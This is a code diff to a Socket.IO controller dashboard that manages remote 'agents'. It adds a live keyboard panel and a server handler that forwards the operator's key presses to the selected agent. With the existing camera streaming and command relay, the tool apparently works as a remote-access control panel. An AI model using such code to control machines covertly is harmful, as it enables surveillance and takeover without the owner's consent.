@@ -433,6 +433,14 @@ DASHBOARD_HTML = '''
                         <button class="btn" onclick="startCameraStream()">Camera Stream</button>
                         <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                     </div>
+
+                    <div class="control-group">
+                        <div class="control-header">Live Keyboard</div>
+                        <div class="input-group">
+                            <label class="input-label">Press keys here to control the agent directly</label>
+                            <div id="live-keyboard-input" tabindex="0" class="neural-input" style="height: 100px; overflow-y: auto;" placeholder="Click here and start typing..."></div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -629,6 +637,35 @@ DASHBOARD_HTML = '''
             }
         });
 
+        // --- Live Keyboard Event Listeners ---
+        const liveKeyboardInput = document.getElementById('live-keyboard-input');
+
+        liveKeyboardInput.addEventListener('keydown', (event) => {
+            if (!selectedAgentId) return;
+            event.preventDefault();
+            socket.emit('live_key_press', {
+                agent_id: selectedAgentId,
+                event_type: 'down',
+                key: event.key,
+                code: event.code,
+                shift: event.shiftKey,
+                ctrl: event.ctrlKey,
+                alt: event.altKey,
+                meta: event.metaKey
+            });
+        });
+
+        liveKeyboardInput.addEventListener('keyup', (event) => {
+            if (!selectedAgentId) return;
+            event.preventDefault();
+            socket.emit('live_key_press', {
+                agent_id: selectedAgentId,
+                event_type: 'up',
+                key: event.key,
+                code: event.code
+            });
+        });
+
     </script>
 </body>
 </html>
@@ -770,6 +807,14 @@ def handle_command_result(data):
     # Forward the output to all operator dashboards
     emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
     print(f"Received output from {agent_id}: {output[:100]}...")
+
+@socketio.on('live_key_press')
+def handle_live_key_press(data):
+    """Operator sends a live key press to an agent."""
+    agent_id = data.get('agent_id')
+    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
+    if agent_sid:
+        emit('key_press', data, room=agent_sid)
 
 if __name__ == "__main__":
     print("Starting controller with Socket.IO support...")
